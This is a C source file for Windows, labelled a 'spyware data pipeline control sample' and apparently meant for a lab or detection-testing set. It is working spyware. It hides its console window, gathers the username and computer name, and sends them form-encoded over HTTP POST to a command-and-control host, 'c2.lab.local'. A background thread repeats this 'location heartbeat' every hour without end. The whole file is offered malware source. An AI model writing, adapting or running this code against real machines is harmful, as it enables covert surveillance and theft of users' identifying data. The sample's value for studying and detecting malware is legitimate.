/*
   A04_4b: Spyware Data Pipeline Control Sample (Form-Encoded Variant)
   Behavioral Scope: Local system metric aggregation and Form-Encoded HTTP serialization.
   Webcam, video processing, and persistence elements are omitted.
*/

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib") // Required for GetUserNameA
#pragma comment(lib, "user32.lib")   // Required for ShowWindow and GetConsoleWindow

// Laboratory Configuration Constraints
const char *SERVER_HOST = "c2.lab.local";
const char *SERVER_PATH = "/api/v1/report";
const int SERVER_PORT = 80;

// Global Structural Telemetry Containers
char username[256] = {0};
char computer_name[256] = {0};

void gather_static_identity()
{
    DWORD size = sizeof(username);
    if (!GetUserNameA(username, &size))
    {
        strcpy_s(username, sizeof(username), "Unknown_User");
    }

    size = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &size))
    {
        strcpy_s(computer_name, sizeof(computer_name), "Unknown_Host");
    }
}

void get_timestamp(char *buffer, size_t buffer_size)
{
    time_t rawtime;
    struct tm timeinfo;
    time(&rawtime);
    localtime_s(&timeinfo, &rawtime);
    // Note: spaces are replaced with %20 or '+' in strict URL encoding,
    // but standard telemetry pipelines often use underscores or simple formatting to prevent corruption.
    strftime(buffer, buffer_size, "%Y-%m-%d_%H:%M:%S", &timeinfo);
}

void exfiltrate_form_data(const char *form_payload)
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    // Initialize the WinINet session
    hInternet = InternetOpenA("DataPipelineAgent/1.1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        printf("[ERROR] InternetOpenA failed. Error: %lu\n", GetLastError());
        return;
    }

    // Establish communication block to host destination
    hConnect = InternetConnectA(hInternet, SERVER_HOST, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL)
    {
        printf("[ERROR] InternetConnectA failed. Error: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }

    // Open an HTTP POST request handle
    hRequest = HttpOpenRequestA(hConnect, "POST", SERVER_PATH, NULL, NULL, NULL, 0, 0);
    if (hRequest == NULL)
    {
        printf("[ERROR] HttpOpenRequestA failed. Error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // Key Change: Define standard application/x-www-form-urlencoded header
    const char *headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD headers_len = (DWORD)strlen(headers);

    // Transmit serialization stream to laboratory server
    BOOL bSend = HttpSendRequestA(hRequest, headers, headers_len, (LPVOID)form_payload, (DWORD)strlen(form_payload));
    if (bSend)
    {
        printf("[INFO] Form data exfiltration successful\n");
    }
    else
    {
        printf("[ERROR] HttpSendRequestA failed. Error: %lu\n", GetLastError());
    }

    // Free resources safely
    HttpEndRequest(hRequest, NULL, 0, 0);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void log_login_info()
{
    char time_buffer[64] = {0};
    char form_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    // Format: key1=value1&key2=value2&key3=value3
    sprintf_s(form_buffer, sizeof(form_buffer),
              "username=%s&computer_name=%s&login_time=%s",
              username, computer_name, time_buffer);

    exfiltrate_form_data(form_buffer);
}

void log_location()
{
    char time_buffer[64] = {0};
    char form_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    // Format: key1=value1&key2=value2&key3=value3
    sprintf_s(form_buffer, sizeof(form_buffer),
              "username=%s&computer_name=%s&status=location_heartbeat&time=%s",
              username, computer_name, time_buffer);

    exfiltrate_form_data(form_buffer);
}

DWORD WINAPI PipelineWorkerThread(LPVOID lpParam)
{
    while (TRUE)
    {
        log_location();
        Sleep(3600000); // Wait exactly 1 hour
    }
    return 0;
}

int main()
{
    // Hide native prompt frame during data execution phase
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Initialize global identifiers
    gather_static_identity();

    // Execute first data dispatch action
    log_login_info();

    // Create a background worker thread via Win32 process APIs
    HANDLE hThread = CreateThread(NULL, 0, PipelineWorkerThread, NULL, 0, NULL);
    if (hThread == NULL)
    {
        printf("[ERROR] CreateThread failed. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[INFO] HTTP form-encoded data exfiltration pipeline running in the background successfully\n");

    while (TRUE)
    {
        Sleep(10000);
    }

    CloseHandle(hThread);
    return 0;
}